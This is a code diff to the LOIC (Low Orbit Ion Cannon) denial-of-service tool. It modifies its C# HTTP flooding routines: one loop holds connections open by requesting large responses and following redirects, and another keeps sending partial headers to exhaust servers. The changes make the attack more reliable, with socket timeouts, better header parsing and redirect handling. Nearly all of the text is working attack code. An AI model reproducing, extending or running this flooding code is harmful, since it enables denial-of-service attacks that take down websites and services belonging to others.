@@ -178,8 +178,8 @@ namespace LOIC
 				int mincl = 16384; // set minimal content-length to 16KB
 				byte[] rbuf = new byte[bsize];
 				string redirect = "";
-				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 				DateTime stop = DateTime.UtcNow;
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 
 				State = ReqState.Ready;
 				while (IsFlooding)
@@ -190,7 +190,8 @@ namespace LOIC
 					// forget about slow! .. we have enough saveguards in place!
 					while (IsDelayed && (DateTime.UtcNow < stop))
 					{
-						var socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+						socket.ReceiveTimeout = Timeout;
 						socket.ReceiveBufferSize = bsize;
 						try
 						{
@@ -213,6 +214,7 @@ namespace LOIC
 										if (!socket.Connected)
 										{
 											socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+											socket.ReceiveTimeout = Timeout;
 											socket.ReceiveBufferSize = bsize;
 											socket.Connect(RHost);
 										}
@@ -228,37 +230,46 @@ namespace LOIC
 										{
 											header += System.Text.Encoding.ASCII.GetString(rbuf);
 										}
-										string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+										string[] sp = header.Split(new char[]{'\r','\n'}, StringSplitOptions.RemoveEmptyEntries);
 										for (int i = (sp.Length - 1); i >= 0; i--)
 										{
 											string[] tsp = sp[i].Split(new char[]{':'}, 2, StringSplitOptions.RemoveEmptyEntries);
-											if ((tsp[0] == "Content-Length") && (tsp.Length >= 2))
+
+											if (tsp.Length != 2)
+												continue;
+
+											tsp[0] = tsp[0].Trim();
+											tsp[1] = tsp[1].Trim();
+
+											if (tsp[0] == "Location")
+											{ // parse and follow the redirect
+												redirect = tsp[1];
+												if (!redirect.StartsWith("/"))
+												{
+													try { redirect = new Uri(redirect).PathAndQuery; }
+													catch { redirect = ""; }
+												}
+												break;
+											}
+											else if (tsp[0] == "Content-Length")
 											{ // checking if the content-length is long enough to work with this!
 												int sl = 0;
-												if (int.TryParse(tsp[1], out sl))
+												if (int.TryParse(tsp[1], out sl) && sl >= mincl)
 												{
-													if (sl >= mincl)
-													{
-														keeps = true;
-														i = -1;
-													}
+													keeps = true;
+													break;
 												}
 											}
-											else if ((tsp[0] == "Transfer-Encoding") && (tsp.Length >= 2) && (tsp[1].ToLowerInvariant().Trim() == "chunked"))
-											{
-												keeps = true; //well, what doo?
-												i = -1;
-											}
-											else if ((tsp[0] == "Location") && (tsp.Length >= 2))
-											{ // follow the redirect
-												redirect = tsp[1].Trim();
-												i = -1;
+											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
+											{ //well, what doo?
+												keeps = true;
+												break;
 											}
 										}
 									}
 									catch
 									{ }
-								} while ((redirect != "") && (DateTime.UtcNow < stop));
+								} while (redirect != "" && DateTime.UtcNow < stop);
 
 								if (!keeps)
 									Failed++;
@@ -407,14 +418,13 @@ namespace LOIC
 		{
 			try
 			{
-				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
-
 				// header set-up
 				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 				byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
-				State = ReqState.Ready;
-				var stop = DateTime.UtcNow;
+				DateTime stop = DateTime.UtcNow;
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
 
+				State = ReqState.Ready;
 				while (IsFlooding)
 				{
 					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
@@ -427,7 +437,7 @@ namespace LOIC
 						{
 							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 						}
-						var socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						try
 						{
 							socket.Connect(RHost);
